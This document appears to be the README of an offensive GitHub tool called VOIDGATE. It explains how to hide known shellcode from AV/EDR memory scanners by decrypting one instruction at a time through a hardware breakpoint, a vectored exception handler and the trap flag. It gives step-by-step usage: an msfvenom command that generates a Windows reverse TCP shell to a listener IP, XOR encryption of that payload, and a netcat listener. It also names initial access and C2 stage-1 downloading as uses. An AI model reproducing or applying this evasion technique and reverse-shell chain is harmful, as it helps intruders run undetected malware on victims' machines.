

# VOIDGATE
### Description:
A technique that can be used to `bypass AV/EDR memory scanners`. This can be used to hide well-known and detected shellcodes (such as msfvenom) by performing `on-the-fly decryption of individual encrypted assembly instructions`, thus rendering memory scanners useless for that specific memory page.
_______________

### How it works:
This technique will create a `PAGE_EXECUTE_READWRITE` memory region where the encrypted assembly instructions will be stored. The shellcode will be wrapped around some padding. The program will set a `Hardware Breakpoint` (HWBP) on the entrypoint of the shellcode.

Next, the program will install a `Vectored Exception Handler` (VEH). This VEH will basically act like a `debugger`, single stepping through the code, reading the instruction pointer register (RIP) for each `SINGLE STEP` exception received by the VEH, and decrypting the next 16 bytes (maximum x64 assembly instruction length) where RIP points . The VEH also encrypts back the previously decrypted instruction, ensuring that the rest of the shellcode stays always encrypted with the exception of the single assembly instruction currently executed. After that, it will continue execution, with the `TRAP FLAG` configured on the Eflags register. This will ensure that the next assembly instruction will also trigger a breakpoint exception that the VEH can handle.

 After the VEH installation, the `main thread` execution will be redirected to the `payload entrypoint`. When the HWBP will be triggered at the entrypoint, the VEH will stop at each assembly instruction executed, perform the decryption of the next assembly instruction and encrypt the previous encrypted instruction which is saved as a global variable.

By doing this, basically `one single assembly instruciton is decrypted at a time`, with the rest of the `payload staying encrypted`.
____

### Limitations:
`NOTE:` This technique is ideal to obtain an initial access using a basic shellcode such as msfvenom or custom revers shells. This can also be used as an initial stage 1 payload that downloads the rest of the payload from the C2 server.

`NOTE:` This technique is not compatible with all payloads (such as reflective loaders) . Below is a list of current limitations:

* 1.) Since the `VEH` will trigger for `EACH ASSEMBLY INSTRUCTION` executed in the shellcode, the execution speed of the shellcode will be drastically slowed down. For each assembly instruction the CPU executes, the VEH will execute at least an additional 300 ASM instructions to perform the decryption, encryption and restore execution to the main thread. If the given shellcode is optimized for smaller size over performance (such as msfvenom), payload execution will be slower. It can take over 15 seconds (depending on the CPU) to execute an MSFVENOM. This happens since the specific shellcode used by msfvenom is sacrificing performance to obtain smaller payload size.
* 2.) If the shellcode calls `NtCreateThread` or any of its wrappers in Kernelbase.dll with the `entrypoint inside the shellcode`, the payload will `not work` since the VEH will not trigger for that thread execution since there is `no HWBP installed at the entrypoint of the newly created thread`. (Work in progress - will be implemented further in this repo)
* 3.) If the shellcode has some `values/variables stored inside itself` (for example, having the raw string "powershell.exe" that is referenced via an offset in a call to WinExec WINAPI) or some number `saved at an offset`, and the shellcode will later try to load or reference it somewhere, the program will not work since the specific variable or string `will be encrypted` and the VEH does not decrypt it. If the shellcode pushes such arguments on the stack via assembly instructions (`push 0x4141414141414141` to push "AAAAAAAA" on the stack to be used in a call to a function), this technique will work. (Work in progress - will be implemented further in this repo)
_____
### Usage:
 
How to reproduce the POC:

* 1.) Create your msfvenom payload:
```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.33 LPORT=443 -f raw > shell.asm
```
* 2.) Use the XorEncryptPayload.exe to XOR encrypt the payload
```
./XorEncryptPayload.exe C:\Path\to\shell.asm
```
* 3.) Update it inside the main.cpp of Voidgate project
* 4.) Ensure the xor key matches the encryptor and Voidgate project
* 5.) Ensure your listener is waiting for the shellcode
```
nc -nvlp 443
```
* 6.) Execute Voidgate.exe
____
### Demo:

![](https://github.com/vxCrypt0r/voidgate/blob/master/poc.gif)

________

### Disclaimer
This repository is for academic purposes, the use of this software is your responsibility.
